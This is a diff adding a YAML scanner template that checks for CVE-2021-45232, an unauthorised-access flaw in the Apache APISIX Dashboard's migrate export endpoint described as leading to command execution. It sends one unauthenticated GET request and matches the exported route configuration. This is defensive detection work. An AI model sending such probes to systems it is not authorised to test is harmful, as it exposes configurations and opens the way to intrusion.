@@ -1,0 +1,18 @@
+name: Apache APISIX Dashboard RCE CVE-2021-45232
+manual: true
+query: title=="Apache APISIX Dashboard"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /apisix/admin/migrate/export
+    expression: response.status == 200 && response.body.bcontains(b"Consumers\":[],\"Routes\":")
+      && response.body.bcontains(b"PluginConfigs\":")
+expression: r0()
+detail:
+  author: aetkrad
+  links:
+  - https://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247487772&idx=2&sn=09b6c93b14f10f4cb41aecc94ce71c75
+  description: Apache APISIX Dashboard migrate接口存在未授权访问漏洞，可下载路由配置文件以及上传配置文件，导致存在命令执行。
+  tags: rce
